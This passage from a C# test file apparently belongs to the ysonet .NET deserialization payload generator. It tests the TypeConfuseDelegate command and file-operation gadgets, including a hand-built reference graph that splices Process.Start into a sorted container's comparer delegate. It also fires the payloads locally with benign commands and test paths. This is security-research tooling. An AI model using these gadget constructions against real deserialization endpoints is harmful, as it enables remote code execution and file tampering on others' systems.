                "switching the label switches the emitted number: " + ed.GadgetCommandLineForTest());
        }

        // The var/variant flag on the command line belongs to the OUTER gadget. Now that
        // TypeConfuseDelegate has its own var/variant for the root container, and inner-gadget
        // callers hand their InputArgs straight down, an unisolated outer --variant would leak:
        // 4 fails the whole generation (the outer gadget has more variants than TCD) and 2 or 3
        // silently swaps the inner container. GenericGenerator.GenerateInner isolates the
        // option list, and every wrapper with a hardcoded inner gadget uses it.
        private static void OuterVariantDoesNotReachTheInnerTypeConfuseDelegate()
        {
            // These outer gadgets declare 4 variants and wrap a TypeConfuseDelegate inner.
            foreach (string gadget in new[] { "GetterSecurityException", "GetterSettingsPropertyValue" })
            {
                RunResult r = GenerateWithVariant(gadget, "Json.NET", 4);
                AssertTrue(r.Success,
                    gadget + " variant 4 still builds its TypeConfuseDelegate inner: " + r.ErrorMessage);
            }

            // An outer variant inside TypeConfuseDelegate's own 1-3 range must not change the
            // inner payload either, so the isolated build matches a run with no --variant.
            byte[] clean = (byte[])new TypeConfuseDelegateGenerator().GenerateInner("BinaryFormatter", CalcInput());
            AssertTrue(clean != null && clean.Length > 0, "the default inner payload is non-empty");
            foreach (int outer in new[] { 1, 2, 3, 4 })
            {
                InputArgs ia = CalcInput();
                ia.ExtraArguments = new List<string> { "--variant", outer.ToString() };
                byte[] withOuter = (byte[])new TypeConfuseDelegateGenerator().GenerateInner("BinaryFormatter", ia);
                AssertTrue(BytesEqual(clean, withOuter),
                    "an outer --variant " + outer + " does not change the default inner TypeConfuseDelegate payload");
            }
        }

        // The command path RELIES on the sorted container's ordering rule instead of
        // enforcing it: Process.Start only receives the executable in parameter 1 while the
        // executable sorts above the argument string. The default "cmd /c <command>"
        // wrapping is safe by construction ("/" sorts below "c"), but --rawcmd removes that
        // wrapper and a command like "notepad.exe zzz.txt" comes out swapped.
        //
        // Until that input is refused outright, the generator NOTES it - and only in debug
        // mode. That gate is the tested behavior, not an implementation detail: ysonet is
        // embedded as a payload generator by other tools, and a wrapper that merges stderr
        // into what it captures would carry the text into a base64 payload field.
        private static void TypeConfuseDelegateNotesSwappedArgumentsInDebugOnly()
        {
            const string swapped = "notepad.exe zzz.txt";   // executable sorts BELOW its argument
            const string ordered = "zzz.exe aaa.txt";       // and this pair is the right way round

            // Assert the fixtures really are what the test claims, so it cannot pass by
            // accident if the ordering ever stops diverging.
            AssertTrue(String.Compare("notepad.exe", "zzz.txt") < 0,
                "the swapped fixture really does sort the wrong way round");
            AssertTrue(String.Compare("zzz.exe", "aaa.txt") > 0,
                "the ordered fixture really does sort the right way round");

            string outDebug, errDebug, outQuiet, errQuiet;
            byte[] debugBytes = GenerateTcdCapturing(swapped, true, true, out outDebug, out errDebug);
            byte[] quietBytes = GenerateTcdCapturing(swapped, true, false, out outQuiet, out errQuiet);

            AssertTrue(errDebug.Contains("[TypeConfuseDelegate]"),
                "debug mode notes the problem on stderr: " + errDebug);
            AssertTrue(errDebug.Contains("swapped"),
                "the note says what actually happens to the two strings: " + errDebug);
            AssertTrue(errDebug.Contains("--rawcmd"),
                "the note says how to avoid it: " + errDebug);

            // The reason the note is gated. An embedding tool that merges the streams and
            // base64-encodes what it captured must never receive this text.
            AssertEqual("", errQuiet, "a normal run writes nothing to stderr");
            AssertEqual("", outDebug, "the note never reaches stdout, which carries the payload");
            AssertEqual("", outQuiet, "a normal run writes nothing to stdout either");

            // The note is an observation, not a change: identical payload either way.
            AssertTrue(BytesEqual(debugBytes, quietBytes),
                "noting the problem does not change a single byte of the payload");

            // No false positives, in debug mode where a note would be visible:
            string o, e;
            GenerateTcdCapturing(ordered, true, true, out o, out e);
            AssertEqual("", e, "a correctly ordered raw command produces no note");

            GenerateTcdCapturing("calc.exe", true, true, out o, out e);
            AssertEqual("", e, "a raw command with no arguments produces no note (\"\" sorts lowest)");

            // ...including the DEFAULT path, whose "cmd /c" wrapper is exactly why this has
            // gone unnoticed: the pair is always "cmd" and "/c ...".
            GenerateTcdCapturing("notepad.exe zzz.txt", false, true, out o, out e);
            AssertEqual("", e, "the default cmd /c wrapping always sorts correctly, so no note");
        }

        // Generate a TypeConfuseDelegate BinaryFormatter payload, capturing everything
        // generation wrote to stdout and stderr.
        private static byte[] GenerateTcdCapturing(string cmd, bool rawCmd, bool debugMode,
            out string stdout, out string stderr)
        {
            var so = new StringWriter();
            var se = new StringWriter();
            TextWriter prevOut = Console.Out, prevErr = Console.Error;
            RunResult r;
            Console.SetOut(so);
            Console.SetError(se);
            try
            {
                InputArgs ia = new InputArgs();
                ia.Cmd = cmd;
                ia.IsRawCmd = rawCmd;
                ia.Test = false;
                ia.IsDebugMode = debugMode;
                r = PayloadRunner.GenerateGadget(new GenerationRequest
                {
                    GadgetName = "TypeConfuseDelegate",
                    FormatterName = "BinaryFormatter",
                    OutputFormat = "",
                    InputArgs = ia,
                });
            }
            finally { Console.SetOut(prevOut); Console.SetError(prevErr); }

            stdout = so.ToString();
            stderr = se.ToString();
            AssertTrue(r.Success, "TypeConfuseDelegate generates for \"" + cmd + "\": " + r.ErrorMessage);
            return Bytes(r.Raw);
        }

        // Generate with a RAW command (no "cmd /c" wrapper), so the test controls exactly how
        // the command splits into the executable and argument strings.
        private static RunResult GenerateTcdRaw(string rawCmd, int variant)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = rawCmd;
            ia.IsRawCmd = true;
            ia.Test = false;
            ia.ExtraArguments = new List<string> { "--variant", variant.ToString() };
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = "TypeConfuseDelegate",
                FormatterName = "BinaryFormatter",
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        // The three command-path builders moved behind one shared builder
        // (TypeConfuseDelegateGenerator.BuildConfusedContainer), which the XAML path now uses
        // too. A refactor of a SHIPPED payload must not change a byte, so each container is
        // rebuilt here the way its own builder used to and compared on the wire. This is a
        // permanent lock, not a one-off check: any future change to the shared builder that
        // alters the serialized graph fails here.
        private static void TypeConfuseDelegateSharedBuilderKeepsTheOriginalGraphs()
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = "calc.exe /x";
            ia.IsRawCmd = true;
            ia.Test = false;

            string key1 = ia.CmdFileName;
            string key2 = ia.HasArguments ? ia.CmdArguments : "";
            AssertTrue(!string.IsNullOrEmpty(key1) && key1 != key2,
                "the fixture command splits into two distinct strings (got \"" + key1 + "\" and \"" + key2 + "\")");

            // Variant 1 through its public builder.
            AssertTrue(BytesEqual(BfBytes(ReferenceCommandGraph(1, key1, key2)),
                                  BfBytes(TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(ia))),
                "the SortedSet command payload still serializes the original graph");

            // Variants 2 and 3 through the CLI path, because their builders are private. The
            // non-minified BinaryFormatter route is a plain BinaryFormatter.Serialize (see
            // GenericGenerator.Serialize), so the generated payload must equal the reference
            // graph byte for byte.
            foreach (int container in new[] { 2, 3 })
            {
                RunResult r = GenerateTcdRaw("calc.exe /x", container);
                AssertTrue(r.Success, "variant " + container + " generates: " + r.ErrorMessage);
                AssertTrue(BytesEqual(BfBytes(ReferenceCommandGraph(container, key1, key2)), Bytes(r.Raw)),
                    "variant " + container + " still serializes the original graph");
            }

            // The XAML path shares the same builder, and the builder now takes the benign
            // comparison as a parameter. The file-operation gadget passes
            // String.CompareOrdinal; passing it here instead would silently change every
            // ActivitySurrogateDisableTypeCheck / XamlAssemblyLoadFromFile payload on the
            // wire. Nothing else would notice - the containers would still fire - so assert
            // the serialized method name directly for all three roots.
            //
            // (The reference-graph comparison above cannot be used for this path: building
            // a XamlReader.Parse delegate would make the test project reference
            // PresentationFramework, which it deliberately does not.)
            const string xaml = "<ResourceDictionary xmlns=\"x\" />";
            foreach (int container in new[] { 1, 2, 3 })
            {
                string text = Encoding.ASCII.GetString(
                    BfBytes(TypeConfuseDelegateGenerator.GetXamlGadget(xaml, container)));
                AssertTrue(text.Contains("Compare") && !text.Contains("CompareOrdinal"),
                    "the XAML wrapper still serializes the original culture-sensitive "
                    + "String.Compare (container " + container + ")");
                AssertTrue(text.Contains("XamlReader"),
                    "the XAML wrapper still splices XamlReader.Parse (container " + container + ")");
            }
        }

        // The command-path graph as the three separate builders used to build it: comparer,
        // fill the root with the two strings while the comparison is still benign, then splice
        // Process.Start into invocation-list slot 1.
        private static object ReferenceCommandGraph(int container, string key1, string key2)
        {
            return ReferenceGraph(container, new Comparison<string>(String.Compare),
                new Func<string, string, System.Diagnostics.Process>(System.Diagnostics.Process.Start),
                key1, key2);
        }

        // The same reference build for any benign comparison and any spliced delegate, so a
        // test can reproduce the XAML path and the file-operation path too.
        private static object ReferenceGraph(int container, Comparison<string> benign,
            Delegate slot1, string key1, string key2)
        {
            Delegate da = benign;
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            IComparer<string> comp = Comparer<string>.Create(d);

            object root;
            if (container == 2)
            {
                var dictionary = new SortedDictionary<string, string>(comp);
                dictionary.Add(key1, "");
                dictionary.Add(key2, "");
                root = dictionary;
            }
            else if (container == 3)
            {
                Type openTreeSet = typeof(SortedSet<>).Assembly.GetType(
                    "System.Collections.Generic.TreeSet`1", false);
                AssertTrue(openTreeSet != null, "the internal TreeSet type is available");
                root = Activator.CreateInstance(openTreeSet.MakeGenericType(typeof(string)),
                    new object[] { comp });
                var items = (ICollection<string>)root;
                items.Add(key1);
                items.Add(key2);
            }
            else
            {
                var set = new SortedSet<string>(comp);
                set.Add(key1);
                set.Add(key2);
                root = set;
            }

            System.Reflection.FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList",
                System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            invoke_list[1] = slot1;
            fi.SetValue(d, invoke_list);
            return root;
        }

        private static byte[] BfBytes(object graph)
        {
            var bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
            using (var ms = new MemoryStream())
            {
                bf.Serialize(ms, graph);
                return ms.ToArray();
            }
        }

        // ---- TypeConfuseDelegateFileOperations ---------------------------------
        //
        // The same delegate confusion with a two-string BCL file method in invocation-list
        // slot 1 instead of Process.Start, so a deserialize writes, copies, moves or
        // truncates on the target without starting a process. Five operations (--variant)
        // crossed with the three serialized roots (--rootcontainer).

        private const string FileOpsGadget = "TypeConfuseDelegateFileOperations";

        private static readonly string[] FileOpsFormatters =
            { "BinaryFormatter", "NetDataContractSerializer", "LosFormatter" };

        // The deserializer tag PayloadsFireIntoTestSinks uses for each of them.
        private static string FileOpsDeserTag(string formatter)
        {
            switch (formatter)
            {
                case "BinaryFormatter": return "bf";
                case "LosFormatter": return "los";
                case "NetDataContractSerializer": return "ndc";
                default: throw new Exception("no deserializer tag for " + formatter);
            }
        }

        private static RunResult GenerateFileOps(int variant, string cmd, string formatter,
            int? rootContainer, bool minify)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = cmd;
            ia.Test = false;
            ia.Minify = minify;
            var extra = new List<string> { "--variant", variant.ToString() };
            if (rootContainer.HasValue)
            {
                extra.Add("--" + TypeConfuseDelegateGenerator.RootContainerOptionName);
                extra.Add(rootContainer.Value.ToString());
            }
            ia.ExtraArguments = extra;
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = FileOpsGadget,
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        private static RunResult GenerateFileOps(int variant, string cmd)
        {
            return GenerateFileOps(variant, cmd, "BinaryFormatter", null, false);
        }

        // The BinaryFormatter bytes read as ASCII, so the embedded type-name and
        // method-name records can be searched.
        private static string FileOpsStreamText(int variant, string cmd, int? rootContainer)
        {
            RunResult r = GenerateFileOps(variant, cmd, "BinaryFormatter", rootContainer, false);
            AssertTrue(r.Success, FileOpsGadget + " variant " + variant + " generates: " + r.ErrorMessage);
            return Encoding.ASCII.GetString(Bytes(r.Raw));
        }

        // A path inside the test artifact directory. The 'zz' / 'aa' prefixes are how the
        // fixtures satisfy the gadget's ordinal-ordering rule without the generator ever
        // rewriting what the test asked for.
        private static string FileOpsPath(string name)
        {
            return TestArtifactPath("ysonet_fileops_" + name);
        }

        // Content whose FIRST character sorts below any Windows path start ('!' is 0x21,
        // below every drive letter and below '\'), so every target path in these tests
        // sorts after the embedded text ordinally.
        private const string FileOpsLowSortingText = "!ysonet file-operations fixture\r\n";

        // The graph must serialize String.CompareOrdinal, not the culture-sensitive
        // String.Compare the command path uses, because the order the two strings are
        // written in is what fixes the sink's argument order. It must also carry the real
        // two-string BCL method for the chosen operation, so a variant cannot silently
        // fall back to another one.
        private static void FileOperationsSerializeAnOrdinalComparerAndTheRealSink()
        {
            string target = FileOpsPath("zz_names.txt");
            string content = MakeTempFile("ysonet_fileops_names_content.txt", FileOpsLowSortingText);
            try
            {
                var sinks = new Dictionary<int, string>
                {
                    { 1, "WriteAllText" }, { 2, "Copy" }, { 3, "Move" },
                    { 4, "Move" }, { 5, "WriteAllText" },
                };
                var declaringTypes = new Dictionary<int, string>
                {
                    { 1, "System.IO.File" }, { 2, "System.IO.File" }, { 3, "System.IO.File" },
                    { 4, "System.IO.Directory" }, { 5, "System.IO.File" },
                };

                foreach (int variant in new[] { 1, 2, 3, 4, 5 })
                {
                    string cmd = FileOpsSampleCommand(variant, target, content);
                    string text = FileOpsStreamText(variant, cmd, null);

                    AssertTrue(text.Contains("CompareOrdinal"),
                        "variant " + variant + " serializes the ordinal benign comparison");
                    AssertTrue(text.Contains("System.Action`2"),
                        "variant " + variant + " carries the two-string Action delegate type");
                    AssertTrue(text.Contains(declaringTypes[variant]),
                        "variant " + variant + " targets " + declaringTypes[variant]);
                    AssertTrue(text.Contains(sinks[variant]),
                        "variant " + variant + " targets " + sinks[variant]);
                    AssertTrue(text.Contains("System.DelegateSerializationHolder"),
                        "variant " + variant + " still carries the delegate serialization holder");
                    AssertTrue(!text.Contains("System.Diagnostics.Process"),
                        "variant " + variant + " starts no process");
                }

                // The command gadget is unchanged: it still ships the culture-sensitive
                // comparison, so this refactor cannot have altered its payloads.
                string tcd = TcdStreamText(1);
                AssertTrue(tcd.Contains("Compare") && !tcd.Contains("CompareOrdinal"),
                    "TypeConfuseDelegate still serializes the original String.Compare");
            }
            finally { SafeDelete(content); }
        }

        // A valid -c for each operation, given a target path and a local content file.
        private static string FileOpsSampleCommand(int variant, string target, string contentFile)
        {
            if (variant == 1)
                return target + ";" + contentFile;
            if (variant == 5)
                return target;
            return FileOpsPath("zz_source.txt") + ";" + FileOpsPath("aa_destination.txt");
        }

        // The whole reason the builder takes a benign comparison: the container is sorted
        // HERE, at generation time, so the payload's argument order is decided by whatever
        // comparison fills it. With the culture-sensitive String.Compare the command path
        // uses, "aa..." sorts BELOW "BB..." and the two arguments would come out reversed;
        // ordinally "aa..." sorts above it. This proves both halves: the bytes do not move
        // when the operator's culture changes, and the operation really receives its source
        // first even in the case where the two comparisons disagree.
        private static void FileOperationsOrderingIsOrdinalNotCultural()
        {
            string source = FileOpsPath("aa_culture_source.txt");
            string dest = FileOpsPath("BB_culture_dest.txt");

            AssertTrue(String.CompareOrdinal(source, dest) > 0,
                "the fixture pair sorts source-first ordinally");
            AssertTrue(String.Compare(source, dest, StringComparison.CurrentCulture) < 0,
                "the same pair sorts the OTHER way under the current culture, which is what "
                + "makes this a real test");

            // Culture independence: identical bytes under two unrelated cultures.
            byte[] underEnglish = FileOpsBytesUnderCulture("en-US", 2, source + ";" + dest);
            byte[] underTurkish = FileOpsBytesUnderCulture("tr-TR", 2, source + ";" + dest);
            byte[] underSwedish = FileOpsBytesUnderCulture("sv-SE", 2, source + ";" + dest);
            AssertTrue(BytesEqual(underEnglish, underTurkish) && BytesEqual(underEnglish, underSwedish),
                "the payload is byte-identical whatever culture it is generated under");

            // Direction: the copy must go source -> destination. If the arguments came out
            // reversed, File.Copy would be asked to read a file that does not exist and the
            // destination would never appear.
            SafeDelete(source);
            SafeDelete(dest);
            try
            {
                File.WriteAllText(source, "ordinal ordering keeps the source first");
                RunSTA(delegate { DeserializeAs("bf", underEnglish); });

                AssertTrue(File.Exists(dest),
                    "the copy ran with the source as its FIRST argument (destination created)");
                AssertEqual("ordinal ordering keeps the source first", File.ReadAllText(dest),
                    "the destination holds the source content");
                AssertTrue(File.Exists(source), "File.Copy leaves the source in place");
            }
            finally { SafeDelete(source); SafeDelete(dest); }
        }

        private static byte[] FileOpsBytesUnderCulture(string culture, int variant, string cmd)
        {
            var previous = System.Threading.Thread.CurrentThread.CurrentCulture;
            try
            {
                System.Threading.Thread.CurrentThread.CurrentCulture =
                    new System.Globalization.CultureInfo(culture);
                RunResult r = GenerateFileOps(variant, cmd);
                AssertTrue(r.Success, "generates under " + culture + ": " + r.ErrorMessage);
                return Bytes(r.Raw);
            }
            finally { System.Threading.Thread.CurrentThread.CurrentCulture = previous; }
        }

        // An input the primitive cannot represent must be refused before serialization,
        // with a message that names the operation and both fields. Never repaired by
        // swapping or rewriting what the user typed.
        private static void FileOperationsRefuseAnImpossibleOrder()
        {
            var reversed = new Dictionary<int, string>
            {
                { 2, FileOpsPath("aa_src.txt") + ";" + FileOpsPath("zz_dst.txt") },
                { 3, FileOpsPath("aa_src.txt") + ";" + FileOpsPath("zz_dst.txt") },
                { 4, FileOpsPath("aa_src") + ";" + FileOpsPath("zz_dst") },
            };
            var names = new Dictionary<int, string> { { 2, "copy" }, { 3, "move" }, { 4, "dirmove" } };

            foreach (KeyValuePair<int, string> kv in reversed)
            {
                RunResult r = GenerateFileOps(kv.Key, kv.Value);
                AssertTrue(!r.Success, "variant " + kv.Key + " refuses a reversed pair");
                AssertTrue((r.ErrorMessage ?? "").Contains(names[kv.Key]),
                    "the refusal names the operation: " + r.ErrorMessage);
                AssertTrue((r.ErrorMessage ?? "").Contains("String.CompareOrdinal"),
                    "the refusal names the comparison that decides: " + r.ErrorMessage);
                AssertTrue((r.ErrorMessage ?? "").Contains("source path")
                    && (r.ErrorMessage ?? "").Contains("destination path"),
                    "the refusal names both semantic fields: " + r.ErrorMessage);

                string same = FileOpsPath("same.txt");
                RunResult equal = GenerateFileOps(kv.Key, same + ";" + same);
                AssertTrue(!equal.Success, "variant " + kv.Key + " refuses an equal pair");
                AssertTrue((equal.ErrorMessage ?? "").Contains("String.CompareOrdinal"),
                    "the equal-pair refusal explains the rule: " + equal.ErrorMessage);
            }

            // The write operation compares the target path against the EMBEDDED TEXT, so a
            // content file whose text sorts above the target path is refused the same way.
            string high = MakeTempFile("ysonet_fileops_high_content.txt", "zzzz sorts above any path");
            try
            {
                RunResult r = GenerateFileOps(1, FileOpsPath("aa_target.txt") + ";" + high);
                AssertTrue(!r.Success, "write refuses content that sorts above the target path");
                AssertTrue((r.ErrorMessage ?? "").Contains("embedded text"),
                    "the write refusal names the embedded text, not the file path: " + r.ErrorMessage);
                AssertTrue((r.ErrorMessage ?? "").Contains("change the content")
                    || (r.ErrorMessage ?? "").Contains("Change the target path"),
                    "the write refusal suggests what to change: " + r.ErrorMessage);
            }
            finally { SafeDelete(high); }

            // Variant 5 pairs the path with an internal "", which every non-empty string
            // sorts after, so it only needs the normal non-empty check.
            AssertTrue(GenerateFileOps(5, FileOpsPath("aa_empty_target.txt")).Success,
                "the empty-file operation accepts a low-sorting target path");
        }

        // -c is split on the FIRST ';' only, both halves are preserved verbatim, and the
        // single-field operation treats a ';' as part of the path.
        private static void FileOperationsParseTheCommandStrictly()
        {
            foreach (int variant in new[] { 1, 2, 3, 4 })
            {
                RunResult noSep = GenerateFileOps(variant, FileOpsPath("zz_only.txt"));
                AssertTrue(!noSep.Success, "variant " + variant + " needs the ';' separator");
                AssertTrue((noSep.ErrorMessage ?? "").Contains(";"),
                    "the message shows the ';' is missing: " + noSep.ErrorMessage);

                AssertTrue(!GenerateFileOps(variant, ";" + FileOpsPath("aa.txt")).Success,
                    "variant " + variant + " refuses an empty first field");
                AssertTrue(!GenerateFileOps(variant, FileOpsPath("zz.txt") + ";").Success,
                    "variant " + variant + " refuses an empty second field");
            }

            // Later semicolons and spaces belong to the second field.
            string source = FileOpsPath("zz source.txt");
            string dest = FileOpsPath("aa dest;with;semicolons.txt");
            string text = FileOpsStreamText(2, source + ";" + dest, null);
            AssertTrue(text.Contains(dest),
                "everything after the first ';' is one destination path, spaces and all");
            AssertTrue(text.Contains(source), "the source path is preserved verbatim");

            // Variant 5 takes the whole value, so a ';' inside the path is unambiguous.
            string odd = FileOpsPath("zz_weird;name.txt");
            AssertTrue(FileOpsStreamText(5, odd, null).Contains(odd),
                "the empty-file operation treats the whole -c value as the target path");
            AssertTrue(!GenerateFileOps(5, "").Success, "the empty-file operation needs a path");
        }

        // The write operation reads its content on THIS machine while the payload is built.
        // Proof: generate, delete the fixture, then deserialize and still get the exact text
        // at the target. It also must never silently treat a missing file as inline text.
        private static void FileOperationsWriteEmbedsTheLocalFileAtGenerationTime()
        {
            // Non-ASCII, plus a UTF-8 BOM on the fixture. File.ReadAllText consumes the BOM,
            // and File.WriteAllText(string,string) writes UTF-8 with no BOM, so the transfer
            // preserves CHARACTERS, not the source file's bytes.
            // The non-ASCII characters are written as \u escapes so this source file itself
            // stays pure ASCII and cannot be corrupted by a compiler codepage guess.
            string body = FileOpsLowSortingText
                + "\u00c4\u00d6\u00dc caf\u00e9 \u4f60\u597d\r\nlast line\r\n";
            string fixture = TestArtifactPath("ysonet_fileops_bom_content.txt");
            string target = FileOpsPath("zz_write_target.txt");
            SafeDelete(fixture);
            SafeDelete(target);
            try
            {
                File.WriteAllText(fixture, body, new UTF8Encoding(true));
                AssertTrue(File.Exists(fixture), "the BOM-bearing content fixture survived the write");
                AssertTrue(File.ReadAllBytes(fixture)[0] == 0xEF, "the fixture really starts with a BOM");
                AssertTrue(String.CompareOrdinal(target, body) > 0,
                    "the fixture pair satisfies the ordinal rule without the generator changing it");

                RunResult r = GenerateFileOps(1, target + ";" + fixture);
                AssertTrue(r.Success, "the write payload generates: " + r.ErrorMessage);
                byte[] payload = Bytes(r.Raw);

                // Delete the source of the text: if anything were read at DESERIALIZE time
                // instead, the next step could not reproduce it.
                SafeDelete(fixture);
                AssertTrue(!File.Exists(fixture), "the local content file is gone before firing");

                RunSTA(delegate { DeserializeAs("bf", payload); });

                AssertTrue(File.Exists(target), "the payload wrote the target file");
                AssertEqual(body, File.ReadAllText(target),
                    "the target holds exactly the decoded text of the deleted fixture");
                byte[] written = File.ReadAllBytes(target);
                AssertTrue(!(written.Length >= 3 && written[0] == 0xEF && written[1] == 0xBB && written[2] == 0xBF),
                    "File.WriteAllText(string,string) writes UTF-8 with no BOM, so the BOM is not re-added");
            }
            finally { SafeDelete(fixture); SafeDelete(target); }

            // A missing or unreadable content file is an error, never inline text.
            RunResult missing = GenerateFileOps(1,
                FileOpsPath("zz_target.txt") + ";" + FileOpsPath("no_such_content_file.txt"));
            AssertTrue(!missing.Success, "a missing local content file fails generation");
            AssertTrue((missing.ErrorMessage ?? "").Contains("LOCAL file"),
                "the message says the second field is a local file: " + missing.ErrorMessage);
            AssertTrue((missing.ErrorMessage ?? "").Contains("never inline text"),
                "the message rules out the inline-text reading: " + missing.ErrorMessage);
        }

        // Both selectors reject anything outside their range instead of quietly falling
        // back to a default, which would hide a typo behind a payload nobody asked for.
        private static void FileOperationsOptionsAreValidated()
        {
            string ok = FileOpsPath("zz_a.txt") + ";" + FileOpsPath("aa_b.txt");

            foreach (string bad in new[] { "nope", "0", "6", "-1", "" })
            {
                InputArgs ia = new InputArgs();
                ia.Cmd = ok;
                ia.Test = false;
                ia.ExtraArguments = new List<string> { "--variant", bad };
                RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
                {
                    GadgetName = FileOpsGadget,
                    FormatterName = "BinaryFormatter",
                    OutputFormat = "",
                    InputArgs = ia,
                });
                AssertTrue(!r.Success, "--variant " + bad + " is rejected");
                AssertTrue((r.ErrorMessage ?? "").IndexOf("variant must be 1, 2, 3, 4, or 5",
                        StringComparison.OrdinalIgnoreCase) >= 0,
                    "--variant " + bad + " reports the allowed values: " + r.ErrorMessage);
            }

            foreach (string bad in new[] { "nope", "0", "4", "-1", "" })
            {
                InputArgs ia = new InputArgs();
                ia.Cmd = ok;
                ia.Test = false;
                ia.ExtraArguments = new List<string>
                {
                    "--variant", "2",
                    "--" + TypeConfuseDelegateGenerator.RootContainerOptionName, bad,
                };
                RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
                {
                    GadgetName = FileOpsGadget,
                    FormatterName = "BinaryFormatter",
                    OutputFormat = "",
                    InputArgs = ia,
                });
                AssertTrue(!r.Success, "--rootcontainer " + bad + " is rejected");
                AssertTrue((r.ErrorMessage ?? "").IndexOf("rootcontainer must be 1, 2, or 3",
                        StringComparison.OrdinalIgnoreCase) >= 0,
                    "--rootcontainer " + bad + " reports the allowed values: " + r.ErrorMessage);
            }

            for (int container = 1; container <= 3; container++)
                AssertTrue(GenerateFileOps(2, ok, "BinaryFormatter", container, false).Success,
                    "--rootcontainer " + container + " is accepted");
        }

        // The container swap changes the serialized ROOT and nothing else, exactly as it
        // does for the command and XAML paths. Omitting the option must equal container 1.
        private static void FileOperationsRootContainersSwapOnlyTheRoot()
        {
            const string sortedSet = "System.Collections.Generic.SortedSet`1";
            const string treeSet = "System.Collections.Generic.TreeSet`1";
            const string sortedDict = "System.Collections.Generic.SortedDictionary`2";
            string cmd = FileOpsPath("zz_c_source.txt") + ";" + FileOpsPath("aa_c_dest.txt");

            AssertTrue(BytesEqual(Bytes(GenerateFileOps(2, cmd, "BinaryFormatter", null, false).Raw),
                                  Bytes(GenerateFileOps(2, cmd, "BinaryFormatter", 1, false).Raw)),
                "no --rootcontainer equals --rootcontainer 1 byte-for-byte");

            string c1 = FileOpsStreamText(2, cmd, 1);
            string c2 = FileOpsStreamText(2, cmd, 2);
            string c3 = FileOpsStreamText(2, cmd, 3);

            AssertTrue(c1.Contains(sortedSet), "container 1 serializes a SortedSet root");
            AssertTrue(c2.Contains(sortedDict) && c2.Contains(treeSet) && !c2.Contains(sortedSet),
                "container 2 serializes a SortedDictionary root with its TreeSet backing set and no SortedSet name");
            AssertTrue(c3.Contains(treeSet) && !c3.Contains(sortedDict) && !c3.Contains(sortedSet),
                "container 3 serializes a bare TreeSet root");

            foreach (string text in new[] { c1, c2, c3 })
            {
                AssertTrue(text.Contains("CompareOrdinal"), "every container keeps the ordinal comparison");
                AssertTrue(text.Contains("System.IO.File"), "every container keeps the file sink");
            }
        }

        // Formatter-expansion result, locked instead of assumed. The candidate set is the
        // four formatters GenericGenerator.Serialize can even produce; the public-member
        // serializers cannot rebuild a MulticastDelegate invocation list at all. Of those
        // four, SoapFormatter is impossible for the same reason it is for every container
        // gadget: each root is a generic type and SoapFormatter cannot serialize one.
        private static void FileOperationsCannotUseSoapFormatter()
        {
            AssertTrue(!Gadget(FileOpsGadget).IsSupported("SoapFormatter"),
                "SoapFormatter is not advertised by " + FileOpsGadget);
            foreach (string f in FileOpsFormatters)
                AssertTrue(Gadget(FileOpsGadget).IsSupported(f), f + " is advertised");

            string cmd = FileOpsPath("zz_soap_source.txt") + ";" + FileOpsPath("aa_soap_dest.txt");
            for (int container = 1; container <= 3; container++)
            {
                var gen = new TypeConfuseDelegateFileOperationsGenerator();
                gen.Options().Parse(new[]
                {
                    "--variant", "2",
                    "--" + TypeConfuseDelegateGenerator.RootContainerOptionName, container.ToString(),
                });
                InputArgs ia = new InputArgs();
                ia.Cmd = cmd;
                ia.Test = false;
                AssertThrows(delegate { gen.Generate("SoapFormatter", ia); },
                    "SoapFormatter cannot serialize the generic root of container " + container);
            }
        }

        // Both strings this gadget carries are user data the target uses literally, so
        // --minify must never rewrite them. The XML minifier is not text preserving
        // (XmlXSLTMinifier trims text nodes, the XmlDocument round trip drops a CR, and a
        // dirty-match pass collapses "; "), so the gadget verifies the serialized payload
        // and refuses instead of delivering a rewritten file.
        //
        // Each case below is measured, not assumed: the same input is fired through the
        // BinaryFormatter (binary, carries the string verbatim) and asserted to arrive
        // intact, so a refusal can never be blamed on the input itself.
        private static void FileOperationsRefuseLossyMinification()
        {
            // What the XML minifier really rewrites, and what it leaves alone.
            var lossy = new[] { "!a\r\nb", "!one line\n", "!one line\r\n", "!a; b; c" };
            var safe = new[] { "!one line no newline", "!a\nb", "!a  b" };

            foreach (string body in lossy)
                AssertFileOpsMinifyVerdict(body, false);
            foreach (string body in safe)
                AssertFileOpsMinifyVerdict(body, true);

            // The limitation belongs to the XML minifier, not to the gadget: the binary
            // formatters minify the SAME lossy input and deliver it byte for byte.
            foreach (string formatter in new[] { "BinaryFormatter", "LosFormatter" })
                foreach (string body in lossy)
                    AssertFileOpsWriteArrivesIntact(body, formatter, true);
        }

        // Assert whether a minified NetDataContractSerializer write payload is allowed for
        // this content, and prove the same content is deliverable without --minify.
        private static void AssertFileOpsMinifyVerdict(string body, bool expectAllowed)
        {
            string label = "content " + Preview(body);
            string fixture = TestArtifactPath("ysonet_fileops_minify_probe.txt");
            string target = FileOpsPath("zz_minify_probe.txt");
            SafeDelete(fixture);
            try
            {
                // Written directly rather than through WriteTestArtifact because the exact
                // encoding is the point (UTF-8, no BOM). Verified straight away, so an
                // antivirus deletion shows up as this message and not as a puzzling refusal.
                File.WriteAllText(fixture, body, new UTF8Encoding(false));
                AssertTrue(File.Exists(fixture), "the content fixture survived the write (" + label + ")");

                RunResult minified = GenerateFileOps(1, target + ";" + fixture,
                    "NetDataContractSerializer", null, true);

                if (expectAllowed)
                {
                    AssertTrue(minified.Success,
                        "minified NDCS is allowed for content the minifier leaves alone (" + label
                        + "): " + minified.ErrorMessage);
                }
                else
                {
                    AssertTrue(!minified.Success,
                        "minified NDCS is refused for content the minifier would rewrite (" + label + ")");
